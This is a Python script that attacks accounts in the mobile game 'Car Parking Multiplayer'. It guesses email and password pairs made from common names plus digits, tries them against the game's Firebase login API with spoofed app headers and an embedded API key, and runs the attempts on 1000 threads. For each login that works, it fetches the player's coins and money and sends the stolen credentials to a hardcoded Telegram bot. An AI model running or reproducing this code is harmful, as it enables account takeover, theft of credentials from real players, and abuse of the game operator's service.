import requests, json, datetime, time, os, random, threading, string, secrets
import webbrowser

E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'

ID = '7016098393'
token = '7006210929:AAGhfsURXG1lg6mDpt2NKRE8HysZLWu9WIg'

headers = {
    "Content-Type": "application/json",
    "X-Android-Package": "com.olzhas.carparking.multyplayer",
    "X-Android-Cert": "D4962F8124C2E09A66B97C8E326AFF805489FE39",
    "Accept-Language": "tr-TR, en-US",
    "X-Client-Version": "Android/Fallback/X22001001/FirebaseCore-Android",
    "X-Firebase-GMPID": "1:581727203278:android:af6b7dee042c8df539459f",
    "X-Firebase-Client": "H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
    "Host": "www.googleapis.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

def login(email, password):
    data = {
        "email": email,
        "password": password,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID"
    }
    res = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data, headers=headers).json()
    if "idToken" in res:
        tkn = res["idToken"]
        data2 = {
            "idToken": tkn
        }
        res2 = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data2, headers=headers).json()
        deta = res2['users'][0]['createdAt']
        data3 = {
            "data": "2893216D41959108CB8FA08951CB319B7AD80D02"
        }
        he = {
            "authorization": f"Bearer {tkn}",
            "firebase-instance-id-token": "f0Rstd-MTbydQx9M2eLlTM:APA91bF7UdxnXLAaybpBODKCRnyLu44eFWygoIfnLn7kOE9aujlb5WcvTv-EyA5mTNbVBPQ-r-x967XJqEA3TX23gGyXCSbMEEa2PIccvNU98uEcdun1qMgYbCOY4hPBBD2w6G9mfX_m",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.12.13"
        }
        info = requests.post("https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2", json=data3, headers=he).text
        data_account = json.loads(info)
        if 'result' in data_account:
            data_account['result'] = json.loads(data_account['result'])
        result_account = data_account["result"]
        Coins = result_account['coin']
        Money = result_account['money']
        timestamp_str = deta
        timestamp = int(timestamp_str) / 1000
        date = datetime.datetime.fromtimestamp(timestamp)
        info_dict = json.loads(info)
        if "Name" in info_dict:
            player_name = info_dict["Name"]
        else:
            player_name = ''
        success_message = f"GOOD:\nEmail: {email}\npassword: {password}\nPlayer name: {player_name}\n data : {date}\n Coins: {Coins}\n Money: {Money}"
        print(success_message)
        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={success_message}')
    else:
        failure_message = f"BAD : {email} | {password}"
        print(failure_message)

def com():
    while True:
        names = ''.join([random.choice(["ali", "mohamed", "ahmed", "youssef", "michael", "mina", "john", "sara", "Locas", "emma",
    "omar", "khaled", "nour", "fatima", "zainab", "hassan", "ibrahim", "adam", "yousef", "sophia",
    "mariam", "james", "david", "linda", "shelby", "jack", "oliver", "lucas", "ella", "charlotte",
    "amelia", "mia", "harper", "evelyn", "abigail", "emily", "scarlett", "grace", "lily", "ella",
    "chloe", "zoey", "avery", "hannah", "layla", "ella", "ella", "ella", "ella", "ella"]) for _ in range(1)])
        numbers1 = ''.join(random.choices('1234567890', k=random.randint(1, 3)))
        password = names + numbers1
        domains = '@gmail.com'
        email = f'{names}{numbers1}{domains}'
        login(email, password)

prox_list = []
for i in range(1000):
    t = threading.Thread(target=com)
    t.start()
    prox_list.append(t)

for t in prox_list:
    t.join()
